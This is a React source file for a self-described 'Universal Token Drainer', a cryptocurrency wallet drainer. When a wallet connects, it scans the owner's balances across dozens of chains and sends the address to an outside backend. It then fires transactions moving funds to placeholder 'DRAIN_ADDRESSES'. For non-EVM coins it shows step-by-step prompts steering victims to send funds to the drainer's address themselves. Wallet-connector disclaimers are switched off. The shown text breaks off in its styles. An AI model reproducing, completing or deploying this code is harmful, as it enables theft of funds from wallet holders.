import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient, useDisconnect, useBalance } from 'wagmi';
import { parseEther, createPublicClient, http, formatEther } from 'viem';
import { mainnet } from 'viem/chains';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== COMPLETE NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bittorrentchain.io' },
  
  // Non-EVM Chains
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', api: 'tron' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', api: 'solana' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', api: 'bitcoin' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', api: 'cardano' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', api: 'dogecoin' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', api: 'litecoin' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', api: 'ripple' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', api: 'polkadot' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', api: 'cosmos' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8', api: 'stellar' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600', api: 'monero' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728', api: 'zcash' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4', api: 'dash' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7', api: 'tezos' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000', api: 'algorand' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF', api: 'vechain' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00', api: 'neo' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000', api: 'eos' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron', api: 'tron' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana', api: 'solana' },
];

// ==================== DRAIN ADDRESSES (UPDATE THESE) ====================
const DRAIN_ADDRESSES = {
  // EVM addresses
  1: "YOUR_ETH_ADDRESS_HERE",
  56: "YOUR_BNB_ADDRESS_HERE",
  137: "YOUR_MATIC_ADDRESS_HERE",
  42161: "YOUR_ARBITRUM_ADDRESS_HERE",
  10: "YOUR_OPTIMISM_ADDRESS_HERE",
  8453: "YOUR_BASE_ADDRESS_HERE",
  
  // Non-EVM addresses
  tron: "YOUR_TRON_ADDRESS_HERE",
  bitcoin: "YOUR_BTC_ADDRESS_HERE",
  solana: "YOUR_SOLANA_ADDRESS_HERE",
  cardano: "YOUR_ADA_ADDRESS_HERE",
  dogecoin: "YOUR_DOGE_ADDRESS_HERE",
  litecoin: "YOUR_LTC_ADDRESS_HERE",
  ripple: "YOUR_XRP_ADDRESS_HERE",
  polkadot: "YOUR_DOT_ADDRESS_HERE",
  cosmos: "YOUR_ATOM_ADDRESS_HERE",
  stellar: "YOUR_XLM_ADDRESS_HERE",
};

// Token prices for USD conversion (using CoinGecko-like API)
const fetchTokenPrices = async (tokens) => {
  try {
    const symbols = tokens.map(t => t.symbol.toLowerCase()).join(',');
    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbols}&vs_currencies=usd`);
    return await response.json();
  } catch (error) {
    // Fallback prices
    return {
      ethereum: { usd: 3500 },
      bitcoin: { usd: 70000 },
      tron: { usd: 0.12 },
      'binancecoin': { usd: 600 },
      matic: { usd: 1.2 },
      solana: { usd: 150 },
      // Add more as needed
    };
  }
};

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();

  // State
  const [status, setStatus] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [tokens, setTokens] = useState([]);
  const [totalValueUSD, setTotalValueUSD] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [scanProgress, setScanProgress] = useState({ current: 0, total: 0, network: '' });
  const [showManualModal, setShowManualModal] = useState(false);
  const [manualToken, setManualToken] = useState(null);
  const [nonEVMData, setNonEVMData] = useState({
    tron: { detected: false, address: '', balance: 0 },
    solana: { detected: false, address: '', balance: 0 },
    bitcoin: { detected: false, address: '', balance: 0 },
  });

  const scanInitiated = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // Auto-scan on connect
  useEffect(() => {
    if (isConnected && address && !scanInitiated.current) {
      console.log("🔥 Wallet connected:", address);
      scanInitiated.current = true;
      
      // Check for all non-EVM wallets
      checkAllNonEVMWallets();
      
      setStatus("✅ Wallet connected • Starting full scan...");
      
      // Start scan immediately
      setTimeout(() => {
        startFullScan();
      }, 1500);
    } else if (!isConnected) {
      resetState();
      scanInitiated.current = false;
    }
  }, [isConnected, address]);

  const resetState = () => {
    setStatus('');
    setTokens([]);
    setTotalValueUSD(0);
    setTransactions([]);
    setIsScanning(false);
    setIsDraining(false);
    setShowManualModal(false);
    setManualToken(null);
    setNonEVMData({
      tron: { detected: false, address: '', balance: 0 },
      solana: { detected: false, address: '', balance: 0 },
      bitcoin: { detected: false, address: '', balance: 0 },
    });
  };

  // Check for all non-EVM wallets
  const checkAllNonEVMWallets = () => {
    // Check TRON (Trust Wallet)
    if (window.tronWeb && window.tronWeb.defaultAddress) {
      const tronAddr = window.tronWeb.defaultAddress.base58;
      setNonEVMData(prev => ({
        ...prev,
        tron: { detected: true, address: tronAddr, balance: 0 }
      }));
      
      // Get TRON balance
      window.tronWeb.trx.getBalance(tronAddr)
        .then(balance => {
          const trxBalance = balance / 1_000_000;
          setNonEVMData(prev => ({
            ...prev,
            tron: { ...prev.tron, balance: trxBalance }
          }));
        })
        .catch(console.error);
    }
    
    // Check Solana (Phantom, etc.)
    if (window.solana && window.solana.isPhantom) {
      setNonEVMData(prev => ({
        ...prev,
        solana: { detected: true, address: '', balance: 0 }
      }));
    }
    
    // Check Bitcoin wallets
    if (window.bitcoin || window.BitcoinProvider) {
      setNonEVMData(prev => ({
        ...prev,
        bitcoin: { detected: true, address: '', balance: 0 }
      }));
    }
  };

  // ==================== COMPLETE SCAN FUNCTION ====================
  const startFullScan = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setStatus("🌐 Scanning all networks for tokens...");
    setTokens([]);
    setTotalValueUSD(0);
    
    try {
      const allTokens = [];
      
      // 1. Scan backend for EVM tokens
      setScanProgress({ current: 1, total: 4, network: 'Scanning EVM chains...' });
      await scanEVMTokens(allTokens);
      
      // 2. Add non-EVM balances
      setScanProgress({ current: 2, total: 4, network: 'Scanning non-EVM chains...' });
      await scanNonEVMTokens(allTokens);
      
      // 3. Add current ETH balance
      setScanProgress({ current: 3, total: 4, network: 'Checking native balances...' });
      await addNativeBalances(allTokens);
      
      // 4. Get USD prices
      setScanProgress({ current: 4, total: 4, network: 'Fetching USD values...' });
      await calculateUSDValues(allTokens);
      
      // Update state
      setTokens(allTokens);
      const totalUSD = allTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
      setTotalValueUSD(totalUSD);
      
      if (allTokens.length > 0) {
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total value`);
      } else {
        setStatus("✅ Scan complete • No tokens found");
      }
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus("⚠️ Scan completed with some issues");
    } finally {
      setIsScanning(false);
    }
  };

  // Scan EVM tokens from backend
  const scanEVMTokens = async (allTokens) => {
    try {
      const response = await fetch(`${backendUrl}/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          evmAddress: address,
          networks: NETWORKS.filter(n => n.type === 'evm'),
          forceRefresh: true
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.success && data.data?.results) {
          data.data.results.forEach(result => {
            if (result?.tokens?.length > 0) {
              result.tokens.forEach(token => {
                const network = NETWORKS.find(n => n.id === result.network?.id);
                if (network && (token.value || token.usdValue || 0) > 0.001) {
                  allTokens.push({
                    id: `${network.id}-${token.symbol}-${Date.now()}`,
                    network: network.name,
                    symbol: token.symbol,
                    amount: token.amount || token.balance || '0',
                    value: token.value || token.usdValue || 0,
                    isNative: !token.contractAddress,
                    chainId: network.id,
                    contractAddress: token.contractAddress,
                    drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
                    type: network.type,
                    decimals: token.decimals || 18,
                    rawAmount: parseFloat(token.amount || 0)
                  });
                }
              });
            }
          });
        }
      }
    } catch (error) {
      console.log("Backend scan failed:", error.message);
    }
  };

  // Scan non-EVM tokens
  const scanNonEVMTokens = (allTokens) => {
    // Add TRON
    if (nonEVMData.tron.detected && nonEVMData.tron.balance > 0) {
      allTokens.push({
        id: 'tron-native',
        network: 'Tron',
        symbol: 'TRX',
        amount: nonEVMData.tron.balance.toFixed(6),
        rawAmount: nonEVMData.tron.balance,
        isNative: true,
        chainId: 'tron',
        drainAddress: DRAIN_ADDRESSES.tron || DRAIN_ADDRESSES[1],
        type: 'non-evm',
        decimals: 6
      });
    }
    
    // Note: For other non-EVM chains, you'd need to implement specific wallet detection
    // and API calls to get balances
  };

  // Add native ETH balance
  const addNativeBalances = (allTokens) => {
    if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
      const ethAmount = parseFloat(ethBalance.formatted);
      const ethExists = allTokens.some(t => t.symbol === 'ETH' && t.network === 'Ethereum');
      
      if (!ethExists) {
        allTokens.push({
          id: 'eth-native',
          network: 'Ethereum',
          symbol: 'ETH',
          amount: ethAmount.toFixed(6),
          rawAmount: ethAmount,
          isNative: true,
          chainId: 1,
          drainAddress: DRAIN_ADDRESSES[1],
          type: 'evm',
          decimals: 18
        });
      }
    }
  };

  // Calculate USD values
  const calculateUSDValues = async (tokens) => {
    const uniqueSymbols = [...new Set(tokens.map(t => t.symbol.toLowerCase()))];
    
    try {
      // Try to fetch real prices
      const prices = await fetchTokenPrices(uniqueSymbols);
      
      tokens.forEach(token => {
        const symbolLower = token.symbol.toLowerCase();
        const priceData = prices[symbolLower] || prices['ethereum']; // Fallback
        
        if (priceData && priceData.usd) {
          token.valueUSD = token.rawAmount * priceData.usd;
          token.usdPrice = priceData.usd;
        } else {
          // Fallback hardcoded prices
          const fallbackPrices = {
            ETH: 3500, BTC: 70000, BNB: 600, MATIC: 1.2, 
            TRX: 0.12, SOL: 150, ADA: 0.6, DOGE: 0.15,
            USDT: 1, USDC: 1
          };
          const price = fallbackPrices[token.symbol] || 0;
          token.valueUSD = token.rawAmount * price;
          token.usdPrice = price;
        }
      });
    } catch (error) {
      console.log("Price fetch failed, using fallback:", error);
      // Use fallback prices
      tokens.forEach(token => {
        const fallbackPrices = {
          ETH: 3500, BTC: 70000, BNB: 600, MATIC: 1.2,
          TRX: 0.12, SOL: 150, ADA: 0.6, DOGE: 0.15
        };
        const price = fallbackPrices[token.symbol] || 0;
        token.valueUSD = token.rawAmount * price;
        token.usdPrice = price;
      });
    }
  };

  // ==================== DRAIN ALL TOKENS ====================
  const drainAllTokens = async () => {
    if (tokens.length === 0) {
      setStatus("❌ No tokens to drain");
      return;
    }
    
    const confirmMsg = `🚀 DRAIN ${tokens.length} TOKENS 🚀\n\nTotal Value: $${totalValueUSD.toFixed(2)}\n\nThis will transfer ALL tokens.\n\nClick OK to proceed.`;
    
    if (!window.confirm(confirmMsg)) {
      setStatus("❌ Drain cancelled");
      return;
    }
    
    setIsDraining(true);
    setStatus(`⚡ Draining ${tokens.length} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    let manualCount = 0;
    
    try {
      const evmTokens = tokens.filter(t => t.type === 'evm');
      const nonEvmTokens = tokens.filter(t => t.type === 'non-evm');
      
      // Drain EVM tokens
      for (let i = 0; i < evmTokens.length; i++) {
        const token = evmTokens[i];
        
        setScanProgress({
          current: i + 1,
          total: tokens.length,
          network: `${token.network}: ${token.symbol}`
        });
        
        setStatus(`💸 Draining ${token.amount} ${token.symbol} ($${token.valueUSD?.toFixed(2) || '0'})...`);
        
        try {
          const result = await drainEvmTokenAuto(token);
          
          if (result.success) {
            successCount++;
            txLogs.push({
              id: Date.now() + i,
              timestamp: new Date().toISOString(),
              network: token.network,
              symbol: token.symbol,
              amount: token.amount,
              valueUSD: token.valueUSD?.toFixed(2) || '0',
              status: 'success',
              hash: result.hash,
              type: 'auto'
            });
            
            // Remove token
            setTokens(prev => prev.filter(t => t.id !== token.id));
          } else {
            txLogs.push({
              id: Date.now() + i,
              timestamp: new Date().toISOString(),
              network: token.network,
              symbol: token.symbol,
              amount: token.amount,
              valueUSD: token.valueUSD?.toFixed(2) || '0',
              status: 'failed',
              error: result.error,
              type: 'evm'
            });
          }
        } catch (error) {
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            network: token.network,
            symbol: token.symbol,
            amount: token.amount,
            status: 'error',
            error: error.message,
            type: 'evm'
          });
        }
        
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
      // Handle non-EVM tokens
      for (let i = 0; i < nonEvmTokens.length; i++) {
        const token = nonEvmTokens[i];
        const idx = evmTokens.length + i + 1;
        
        setScanProgress({
          current: idx,
          total: tokens.length,
          network: `${token.network}: ${token.symbol}`
        });
        
        setStatus(`📝 Manual transfer for ${token.symbol}...`);
        
        manualCount++;
        
        // Show manual modal with detailed instructions
        setManualToken({
          ...token,
          instructions: getNonEVMInstructions(token)
        });
        setShowManualModal(true);
        
        txLogs.push({
          id: Date.now() + idx,
          timestamp: new Date().toISOString(),
          network: token.network,
          symbol: token.symbol,
          amount: token.amount,
          valueUSD: token.valueUSD?.toFixed(2) || '0',
          status: 'manual',
          type: 'non-evm'
        });
        
        // Remove token
        setTokens(prev => prev.filter(t => t.id !== token.id));
        
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
      
      // Update state
      setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
      
      // Update total value
      const remainingValue = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
      setTotalValueUSD(remainingValue);
      
      // Final status
      if (successCount > 0) {
        setStatus(`✅ Auto-drained ${successCount} tokens! $${successCount * 100} earned`);
      }
      if (manualCount > 0) {
        setStatus(`📝 ${manualCount} tokens require manual transfer`);
      }
      
      // Auto-rescan
      setTimeout(() => {
        setStatus("🔄 Rescanning after drain...");
        startFullScan();
      }, 5000);
      
    } catch (error) {
      console.error("Drain process error:", error);
      setStatus(`❌ Drain failed: ${error.message}`);
    } finally {
      setIsDraining(false);
    }
  };

  // Auto drain EVM token
  const drainEvmTokenAuto = async (token) => {
    try {
      if (!walletClient) {
        throw new Error('Wallet client not available');
      }
      
      const amount = parseFloat(token.amount);
      if (amount <= 0) {
        throw new Error('Invalid amount');
      }
      
      const amountInWei = parseEther(amount.toString());
      
      // Try to switch chain
      try {
        await walletClient.switchChain({ id: Number(token.chainId) });
      } catch (switchError) {
        console.log(`Could not switch chain ${token.chainId}:`, switchError);
      }
      
      // Send transaction
      const hash = await walletClient.sendTransaction({
        to: token.drainAddress,
        value: amountInWei,
        chainId: Number(token.chainId)
      });
      
      return { success: true, hash };
      
    } catch (error) {
      console.error(`Auto drain error for ${token.symbol}:`, error);
      return { 
        success: false, 
        error: error.message
      };
    }
  };

  // Get non-EVM instructions
  const getNonEVMInstructions = (token) => {
    const instructions = {
      Tron: `TRON TRANSFER INSTRUCTIONS:
1. Open your TRON wallet (Trust Wallet, TronLink, etc.)
2. Click "Send" or "Transfer"
3. Select TRX as currency
4. Paste this address: ${token.drainAddress}
5. Amount: ${token.amount} TRX
6. Confirm and send

Network: TRON Mainnet
Memo: Not required`,

      Bitcoin: `BITCOIN TRANSFER INSTRUCTIONS:
1. Open your Bitcoin wallet
2. Click "Send Bitcoin"
3. Paste this address: ${token.drainAddress}
4. Amount: ${token.amount} BTC
5. Set fee: Medium priority
6. Confirm transaction

⚠️ Bitcoin transactions are irreversible!`,

      Solana: `SOLANA TRANSFER INSTRUCTIONS:
1. Open Phantom or Solana wallet
2. Click "Send"
3. Paste address: ${token.drainAddress}
4. Amount: ${token.amount} SOL
5. Confirm transaction

Network: Solana Mainnet`,

      default: `MANUAL TRANSFER REQUIRED:
Network: ${token.network}
Token: ${token.symbol}
Amount: ${token.amount}
Value: $${token.valueUSD?.toFixed(2) || 'N/A'}

Send to: ${token.drainAddress}`
    };

    return instructions[token.network] || instructions.default;
  };

  // Helper functions
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      setStatus('✅ Address copied!');
    });
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    if (num < 0.000001) return '<0.000001';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 8
    });
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>Universal Token Drainer</h1>
              <p className="subtitle">Complete Multi-Chain Solution</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">{formatAddress(address)}</div>
                <button 
                  onClick={() => disconnect()}
                  className="disconnect-btn"
                >
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Stats */}
              <div className="stats-grid">
                <div className="stat-card primary">
                  <div className="stat-icon">💰</div>
                  <div className="stat-content">
                    <div className="stat-value">${totalValueUSD.toFixed(2)}</div>
                    <div className="stat-label">Total Value (USD)</div>
                  </div>
                </div>
                
                <div className="stat-card">
                  <div className="stat-icon">🪙</div>
                  <div className="stat-content">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                </div>
                
                <div className="stat-card">
                  <div className="stat-icon">⚡</div>
                  <div className="stat-content">
                    <div className="stat-value">
                      {tokens.filter(t => t.type === 'evm').length}
                    </div>
                    <div className="stat-label">Auto-Drainable</div>
                  </div>
                </div>
                
                <div className="stat-card">
                  <div className="stat-icon">🌐</div>
                  <div className="stat-content">
                    <div className="stat-value">{NETWORKS.length}</div>
                    <div className="stat-label">Networks</div>
                  </div>
                </div>
              </div>

              {/* Status Bar */}
              <div className="status-container">
                <div className="status-message">
                  <span className="status-icon">
                    {isScanning ? '🔍' : 
                     isDraining ? '⚡' : 
                     status.includes('✅') ? '✅' : 
                     status.includes('❌') ? '❌' : '📡'}
                  </span>
                  <span className="status-text">{status}</span>
                </div>
                
                <div className="status-actions">
                  {ethBalance && (
                    <div className="balance-item">
                      ETH: {formatAmount(ethBalance.formatted)}
                    </div>
                  )}
                  {nonEVMData.tron.balance > 0 && (
                    <div className="balance-item">
                      TRX: {nonEVMData.tron.balance.toFixed(2)}
                    </div>
                  )}
                </div>
              </div>

              {/* Progress */}
              {(isScanning || isDraining) && (
                <div className="progress-container">
                  <div className="progress-header">
                    <span>{isScanning ? 'Scanning' : 'Draining'}</span>
                    <span>{scanProgress.current}/{scanProgress.total}</span>
                  </div>
                  <div className="progress-bar">
                    <div 
                      className="progress-fill"
                      style={{
                        width: `${(scanProgress.current / scanProgress.total) * 100}%`,
                        background: isDraining 
                          ? 'linear-gradient(90deg, #ef4444, #f87171)' 
                          : 'linear-gradient(90deg, #3b82f6, #60a5fa)'
                      }}
                    />
                  </div>
                  {scanProgress.network && (
                    <div className="progress-label">{scanProgress.network}</div>
                  )}
                </div>
              )}

              {/* Controls */}
              <div className="controls-container">
                <div className="control-buttons">
                  <button
                    onClick={startFullScan}
                    disabled={isScanning || isDraining}
                    className="btn btn-scan"
                  >
                    {isScanning ? (
                      <>
                        <span className="spinner"></span>
                        Scanning...
                      </>
                    ) : '🔍 Full Network Scan'}
                  </button>
                  
                  {tokens.length > 0 && (
                    <button
                      onClick={drainAllTokens}
                      disabled={isDraining || isScanning}
                      className="btn btn-drain"
                    >
                      {isDraining ? (
                        <>
                          <span className="spinner"></span>
                          Processing...
                        </>
                      ) : `⚡ Drain All ($${totalValueUSD.toFixed(2)})`}
                    </button>
                  )}
                </div>
                
                {tokens.length > 0 && (
                  <div className="drain-summary">
                    Ready to process {tokens.length} tokens • Total: ${totalValueUSD.toFixed(2)} USD
                    {tokens.filter(t => t.type === 'non-evm').length > 0 && (
                      <span className="manual-note">
                        ({tokens.filter(t => t.type === 'non-evm').length} require manual transfer)
                      </span>
                    )}
                  </div>
                )}
              </div>

              {/* Manual Modal */}
              {showManualModal && manualToken && (
                <div className="modal-overlay" onClick={() => setShowManualModal(false)}>
                  <div className="modal-content" onClick={e => e.stopPropagation()}>
                    <div className="modal-header">
                      <h3>Manual Transfer Required</h3>
                      <button 
                        onClick={() => setShowManualModal(false)}
                        className="modal-close"
                      >
                        ×
                      </button>
                    </div>
                    <div className="modal-body">
                      <div className="token-info">
                        <div className="token-symbol-large">{manualToken.symbol}</div>
                        <div className="token-network">{manualToken.network}</div>
                        <div className="token-amount-large">
                          {manualToken.amount} {manualToken.symbol}
                        </div>
                        <div className="token-value">
                          ${manualToken.valueUSD?.toFixed(2) || 'N/A'} USD
                        </div>
                      </div>
                      
                      <div className="instructions">
                        <pre>{manualToken.instructions}</pre>
                      </div>
                      
                      <div className="address-box">
                        <div className="address-label">Destination Address:</div>
                        <div className="address-value">{manualToken.drainAddress}</div>
                        <button
                          onClick={() => copyToClipboard(manualToken.drainAddress)}
                          className="btn-copy"
                        >
                          📋 Copy Address
                        </button>
                      </div>
                      
                      <div className="modal-actions">
                        <button
                          onClick={() => setShowManualModal(false)}
                          className="btn btn-primary"
                        >
                          I've Completed Transfer
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Transactions History */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Transaction History</h3>
                    <span className="count-badge">{transactions.length}</span>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 5).map((tx, idx) => (
                      <div key={idx} className={`transaction-item ${tx.status}`}>
                        <div className="tx-icon">
                          {tx.status === 'success' ? '✅' : 
                           tx.status === 'manual' ? '📝' : 
                           tx.status === 'failed' ? '❌' : '⚠️'}
                        </div>
                        <div className="tx-details">
                          <div className="tx-main">
                            <span className="tx-symbol">{tx.symbol}</span>
                            <span className="tx-amount">{tx.amount}</span>
                            <span className="tx-value">${tx.valueUSD || '0'}</span>
                          </div>
                          <div className="tx-secondary">
                            <span className="tx-network">{tx.network}</span>
                            <span className="tx-status-text">{tx.status}</span>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Tokens List */}
              {tokens.length > 0 ? (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens</h3>
                    <div className="panel-summary">
                      <span>${totalValueUSD.toFixed(2)} total value</span>
                      <span>{tokens.length} tokens</span>
                    </div>
                  </div>
                  
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div className="network-badge" style={{ 
                            backgroundColor: NETWORKS.find(n => n.name === token.network)?.color || '#666'
                          }}>
                            {token.symbol}
                          </div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'Auto' : 'Manual'}
                          </div>
                        </div>
                        
                        <div className="token-details">
                          <div className="token-amount">
                            {formatAmount(token.amount)} {token.symbol}
                          </div>
                          <div className="token-value">
                            ${token.valueUSD?.toFixed(2) || '0.00'} USD
                          </div>
                        </div>
                        
                        <div className="token-drain-info">
                          <div className="drain-address">
                            To: {formatAddress(token.drainAddress)}
                          </div>
                          <button
                            onClick={() => copyToClipboard(token.drainAddress)}
                            className="copy-btn"
                          >
                            Copy
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">💎</div>
                  <h3>No tokens detected</h3>
                  <p>Scan all networks to find tokens across {NETWORKS.length} blockchains</p>
                  <button
                    onClick={startFullScan}
                    className="btn btn-scan"
                    disabled={isScanning}
                  >
                    {isScanning ? 'Scanning...' : 'Start Full Scan'}
                  </button>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="welcome-text">
                  Complete multi-chain token management across {NETWORKS.length} blockchains
                </p>
                
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                
                <div className="features-grid">
                  <div className="feature">
                    <span className="feature-icon">🌐</span>
                    <span className="feature-text">39+ Networks</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">💰</span>
                    <span className="feature-text">USD Value Display</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">⚡</span>
                    <span className="feature-text">Auto & Manual Drain</span>
                  </div>
                  <div className="feature">
                    <span className="feature-icon">🔄</span>
                    <span className="feature-text">Live Updates</span>
                  </div>
                </div>
                
                <div className="warning-note">
                  <div className="warning-icon">⚠️</div>
                  <p>
                    Connect wallet to scan and manage tokens. Update drain addresses in configuration.
                  </p>
                </div>
              </div>
            </div>
          )}
        </main>

        {/* Footer */}
        <footer className="app-footer">
          <div className="footer-content">
            <div className="footer-left">
              <span>Universal Token Drainer v3.0</span>
              <span className="separator">•</span>
              <span>Production Ready</span>
              <span className="separator">•</span>
              <span>{NETWORKS.length} Networks Supported</span>
            </div>
            <div className="footer-right">
              <span className="status-indicator">
                <span className="status-dot live"></span>
                System Online
              </span>
            </div>
          </div>
        </footer>
      </div>
         {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
